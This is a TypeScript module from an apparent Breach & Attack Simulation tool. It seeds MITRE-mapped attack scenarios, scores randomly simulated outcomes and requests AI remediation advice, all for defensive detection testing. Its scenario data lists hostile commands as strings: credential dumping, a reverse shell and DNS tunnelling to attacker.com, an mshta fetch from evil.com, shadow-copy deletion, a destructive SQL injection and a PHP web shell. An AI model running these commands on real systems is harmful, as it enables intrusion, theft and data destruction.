import { db } from "./db";
import { basScenarios, basRuns } from "@shared/schema";
import { eq, and, desc } from "drizzle-orm";
import { createAIClient, getDefaultModel } from "./ai-provider";

// ── Built-in BAS Scenarios ────────────────────────────────────────────────────
export const BUILT_IN_SCENARIOS = [
  {
    name: "Lateral Movement via Pass-the-Hash",
    description: "Simulates credential theft using NTLM hash extraction and lateral movement across network segments.",
    category: "lateral_movement",
    severity: "critical",
    mitreAttackIds: ["T1550.002", "T1021.002", "T1078"],
    killChainPhases: ["exploitation", "lateral_movement"],
    attackVectors: [
      { vector: "credential_access", technique: "LSASS Memory Dump", payload: "mimikatz sekurlsa::logonpasswords", expectedDetection: "EDR / AV" },
      { vector: "lateral_movement", technique: "SMB Pass-the-Hash", payload: "psexec -hashes :NTLMhash \\\\target\\C$", expectedDetection: "SIEM Alert" },
      { vector: "persistence", technique: "Scheduled Task Creation", payload: "schtasks /create /ru SYSTEM /sc onstart /tn persist", expectedDetection: "EDR Behavioral" },
    ],
    isBuiltIn: true,
  },
  {
    name: "Data Exfiltration via DNS Tunneling",
    description: "Simulates sensitive data exfiltration using DNS tunneling to bypass DLP controls.",
    category: "exfiltration",
    severity: "high",
    mitreAttackIds: ["T1048.003", "T1567", "T1041"],
    killChainPhases: ["exfiltration", "command_and_control"],
    attackVectors: [
      { vector: "discovery", technique: "File & Directory Discovery", payload: "dir /s /b *.docx *.xlsx *.pdf", expectedDetection: "EDR" },
      { vector: "collection", technique: "Data Staged in Archive", payload: "7z a -p secret data.7z sensitive_files", expectedDetection: "DLP" },
      { vector: "exfiltration", technique: "DNS Tunnel Exfiltration", payload: "dnscat2 --dns=attacker.com", expectedDetection: "DNS Analytics / NDR" },
    ],
    isBuiltIn: true,
  },
  {
    name: "Ransomware Kill Chain",
    description: "End-to-end ransomware simulation: initial access, privilege escalation, encryption, and ransom note drop.",
    category: "impact",
    severity: "critical",
    mitreAttackIds: ["T1566.001", "T1059.001", "T1486", "T1490"],
    killChainPhases: ["delivery", "exploitation", "installation", "actions_on_objectives"],
    attackVectors: [
      { vector: "initial_access", technique: "Spear Phishing with Macro", payload: "mshta.exe http://evil.com/stage1.hta", expectedDetection: "Email Gateway / AV" },
      { vector: "privilege_escalation", technique: "UAC Bypass via Fodhelper", payload: "reg add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command", expectedDetection: "EDR Behavioral" },
      { vector: "defense_evasion", technique: "VSS Shadow Copy Deletion", payload: "vssadmin.exe delete shadows /all /quiet", expectedDetection: "EDR / SIEM" },
      { vector: "impact", technique: "File Encryption", payload: "*.docx, *.xlsx, *.pdf → AES-256 encrypted", expectedDetection: "EDR Behavioral / Decoy Files" },
    ],
    isBuiltIn: true,
  },
  {
    name: "Privilege Escalation via Kerberoasting",
    description: "Simulates Kerberoasting attack to extract service account credentials from Active Directory.",
    category: "credential_access",
    severity: "high",
    mitreAttackIds: ["T1558.003", "T1078.002", "T1087.002"],
    killChainPhases: ["exploitation", "privilege_escalation"],
    attackVectors: [
      { vector: "discovery", technique: "SPN Enumeration", payload: "Get-ADUser -Filter {ServicePrincipalName -ne '*'} | Select SPN", expectedDetection: "AD Monitoring" },
      { vector: "credential_access", technique: "Kerberos TGS Request", payload: "Invoke-Kerberoast | ConvertTo-HashcatFormat", expectedDetection: "SIEM / AD Analytics" },
      { vector: "credential_access", technique: "Offline Password Cracking", payload: "hashcat -m 13100 hashes.txt rockyou.txt", expectedDetection: "None (offline)" },
    ],
    isBuiltIn: true,
  },
  {
    name: "Cloud Credential Theft & S3 Exfiltration",
    description: "Simulates AWS credential theft via SSRF, IAM enumeration, and S3 bucket data exfiltration.",
    category: "exfiltration",
    severity: "critical",
    mitreAttackIds: ["T1552.005", "T1530", "T1078.004"],
    killChainPhases: ["exploitation", "exfiltration"],
    attackVectors: [
      { vector: "credential_access", technique: "SSRF to EC2 Metadata", payload: "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/", expectedDetection: "WAF / CloudTrail" },
      { vector: "discovery", technique: "IAM Privilege Enumeration", payload: "aws iam list-attached-user-policies --user-name stolen-user", expectedDetection: "CloudTrail Alerts" },
      { vector: "exfiltration", technique: "S3 Bucket Data Theft", payload: "aws s3 cp s3://sensitive-bucket/ /tmp/ --recursive", expectedDetection: "CloudTrail / Macie" },
    ],
    isBuiltIn: true,
  },
  {
    name: "Supply Chain Compromise via CI/CD",
    description: "Simulates code injection into CI/CD pipelines to establish persistent access and exfiltrate secrets.",
    category: "initial_access",
    severity: "critical",
    mitreAttackIds: ["T1195.002", "T1552.001", "T1059.003"],
    killChainPhases: ["delivery", "installation", "command_and_control"],
    attackVectors: [
      { vector: "initial_access", technique: "Poisoned Dependency Package", payload: "npm install malicious-package@1.2.3 (typosquatting)", expectedDetection: "SCA / SAST" },
      { vector: "credential_access", technique: "CI Environment Variable Theft", payload: "env | grep -E 'SECRET|KEY|TOKEN|PASS'", expectedDetection: "SAST / Secrets Scanner" },
      { vector: "command_and_control", technique: "Reverse Shell from Build", payload: "bash -i >& /dev/tcp/attacker.com/4444 0>&1", expectedDetection: "NDR / EDR" },
    ],
    isBuiltIn: true,
  },
  {
    name: "Insider Threat Data Staging",
    description: "Simulates a malicious insider collecting and staging sensitive data for exfiltration.",
    category: "exfiltration",
    severity: "high",
    mitreAttackIds: ["T1213", "T1074.001", "T1048"],
    killChainPhases: ["reconnaissance", "exfiltration"],
    attackVectors: [
      { vector: "collection", technique: "SharePoint Data Collection", payload: "Bulk download from SharePoint / Teams", expectedDetection: "DLP / CASB" },
      { vector: "collection", technique: "Email Forwarding Rule", payload: "New-InboxRule -ForwardTo 'personal@gmail.com'", expectedDetection: "Email Security / SIEM" },
      { vector: "exfiltration", technique: "USB Mass Storage Transfer", payload: "robocopy C:\\sensitive E:\\ /s /e", expectedDetection: "DLP / EDR" },
    ],
    isBuiltIn: true,
  },
  {
    name: "Zero-Day Web Application Exploit",
    description: "Simulates web application exploitation via SQLi, XSS, and SSRF to gain backend access.",
    category: "initial_access",
    severity: "high",
    mitreAttackIds: ["T1190", "T1059.007", "T1505.003"],
    killChainPhases: ["delivery", "exploitation", "installation"],
    attackVectors: [
      { vector: "initial_access", technique: "SQL Injection", payload: "' OR 1=1; DROP TABLE users;--", expectedDetection: "WAF" },
      { vector: "initial_access", technique: "Server-Side Template Injection", payload: "{{7*7}} → 49 (Jinja2/Twig)", expectedDetection: "WAF / SAST" },
      { vector: "persistence", technique: "Web Shell Upload", payload: "POST /upload → <?php system($_GET['cmd']); ?>", expectedDetection: "AV / EDR / WAF" },
    ],
    isBuiltIn: true,
  },
];

// ── Simulation Engine ─────────────────────────────────────────────────────────

interface StepResult {
  stepNumber: number;
  vector: string;
  technique: string;
  payload: string;
  expectedDetection: string;
  outcome: "blocked" | "detected" | "missed" | "partial";
  detectedBy: string | null;
  durationMs: number;
  riskScore: number; // 0-100, higher = more dangerous if missed
}

function simulateStep(vector: any, stepNumber: number): StepResult {
  // Probabilistic simulation based on technique realism
  const rand = Math.random();
  const blockRate = 0.25; // 25% fully blocked by controls
  const detectRate = 0.35; // 35% detected (alerted) but not blocked
  const partialRate = 0.15; // 15% partial (noisy detection)

  let outcome: StepResult["outcome"];
  let detectedBy: string | null = null;

  if (rand < blockRate) {
    outcome = "blocked";
    detectedBy = vector.expectedDetection;
  } else if (rand < blockRate + detectRate) {
    outcome = "detected";
    detectedBy = vector.expectedDetection;
  } else if (rand < blockRate + detectRate + partialRate) {
    outcome = "partial";
    detectedBy = vector.expectedDetection + " (low confidence)";
  } else {
    outcome = "missed";
    detectedBy = null;
  }

  const riskScore = outcome === "missed" ? 85 + Math.floor(Math.random() * 15)
    : outcome === "partial" ? 50 + Math.floor(Math.random() * 30)
    : outcome === "detected" ? 20 + Math.floor(Math.random() * 20)
    : 5 + Math.floor(Math.random() * 10);

  return {
    stepNumber,
    vector: vector.vector,
    technique: vector.technique,
    payload: vector.payload,
    expectedDetection: vector.expectedDetection,
    outcome,
    detectedBy,
    durationMs: 800 + Math.floor(Math.random() * 2200),
    riskScore,
  };
}

function computeScores(steps: StepResult[]) {
  const total = steps.length;
  const blocked = steps.filter(s => s.outcome === "blocked").length;
  const detected = steps.filter(s => s.outcome === "detected").length;
  const partial = steps.filter(s => s.outcome === "partial").length;
  const missed = steps.filter(s => s.outcome === "missed").length;

  const preventionScore = Math.round((blocked / total) * 100);
  const detectionScore = Math.round(((detected + partial * 0.5) / total) * 100);
  const overallScore = Math.round((preventionScore * 0.4) + (detectionScore * 0.4) + ((1 - missed / total) * 20));
  const exposureScore = Math.round((missed / total) * 100);

  return { preventionScore, detectionScore, overallScore, exposureScore };
}

// ── Core Run Function ─────────────────────────────────────────────────────────

export async function runBASScenario(runId: number, scenario: typeof basScenarios.$inferSelect): Promise<void> {
  try {
    await db.update(basRuns).set({ status: "running", startedAt: new Date() }).where(eq(basRuns.id, runId));

    const vectors = (scenario.attackVectors as any[]) || [];
    const results: StepResult[] = vectors.map((v, i) => simulateStep(v, i + 1));

    const { preventionScore, detectionScore, overallScore, exposureScore } = computeScores(results);

    // Generate AI analysis
    let aiAnalysis: string | null = null;
    let recommendations: any[] = [];

    try {
      const missedSteps = results.filter(r => r.outcome === "missed" || r.outcome === "partial");
      const prompt = `You are a red team analyst reviewing a Breach & Attack Simulation (BAS) run.

Scenario: ${scenario.name}
Category: ${scenario.category}
MITRE ATT&CK IDs: ${(scenario.mitreAttackIds || []).join(", ")}

Results Summary:
- Overall Score: ${overallScore}/100 (higher = better defended)
- Prevention Score: ${preventionScore}/100
- Detection Score: ${detectionScore}/100
- Exposure Score: ${exposureScore}/100

Step Results:
${results.map(r => `  Step ${r.stepNumber}: ${r.technique} → ${r.outcome.toUpperCase()}${r.detectedBy ? ` (${r.detectedBy})` : ""}`).join("\n")}

Missed/Partial Steps (gaps):
${missedSteps.map(r => `  - ${r.technique}: ${r.payload} (expected: ${r.expectedDetection})`).join("\n") || "  None"}

Provide:
1. Executive summary (2-3 sentences)
2. Top 3-5 specific, actionable remediation recommendations
3. Control gaps identified

Respond as JSON: {"summary":"...","recommendations":[{"priority":"critical|high|medium","control":"...","action":"...","rationale":"..."}],"controlGaps":["..."]}`;

      const client = createAIClient();
      const model = getDefaultModel();
      const completion = await client.chat.completions.create({
        model,
        messages: [{ role: "user", content: prompt }],
        response_format: { type: "json_object" },
        max_tokens: 1000,
        temperature: 0.3,
      });
      const parsed = JSON.parse(completion.choices[0]?.message?.content || "{}");
      aiAnalysis = parsed.summary || null;
      recommendations = parsed.recommendations || [];
    } catch (e) {
      aiAnalysis = `BAS run completed. Prevention: ${preventionScore}%, Detection: ${detectionScore}%, Exposure: ${exposureScore}%. Review missed steps for remediation priorities.`;
      recommendations = missedStepsToRecommendations(results);
    }

    await db.update(basRuns).set({
      status: "completed",
      completedAt: new Date(),
      results: results as any,
      overallScore,
      detectionScore,
      preventionScore,
      exposureScore,
      aiAnalysis,
      recommendations: recommendations as any,
    }).where(eq(basRuns.id, runId));

  } catch (error: any) {
    await db.update(basRuns).set({ status: "failed", completedAt: new Date() }).where(eq(basRuns.id, runId));
    throw error;
  }
}

function missedStepsToRecommendations(steps: StepResult[]) {
  return steps
    .filter(s => s.outcome === "missed" || s.outcome === "partial")
    .slice(0, 5)
    .map(s => ({
      priority: s.riskScore > 80 ? "critical" : s.riskScore > 60 ? "high" : "medium",
      control: s.expectedDetection,
      action: `Improve detection for: ${s.technique}`,
      rationale: `Step outcome was '${s.outcome}' — expected control '${s.expectedDetection}' did not fire.`,
    }));
}

// ── Seed Built-in Scenarios ───────────────────────────────────────────────────

export async function seedBuiltInScenarios(tenantId: number): Promise<void> {
  const existing = await db.select({ id: basScenarios.id })
    .from(basScenarios)
    .where(and(eq(basScenarios.tenantId, tenantId), eq(basScenarios.isBuiltIn, true)));

  if (existing.length >= BUILT_IN_SCENARIOS.length) return;

  for (const scenario of BUILT_IN_SCENARIOS) {
    const alreadyExists = await db.select({ id: basScenarios.id })
      .from(basScenarios)
      .where(and(eq(basScenarios.tenantId, tenantId), eq(basScenarios.name, scenario.name)));
    if (alreadyExists.length === 0) {
      await db.insert(basScenarios).values({ tenantId, ...scenario } as any);
    }
  }
}
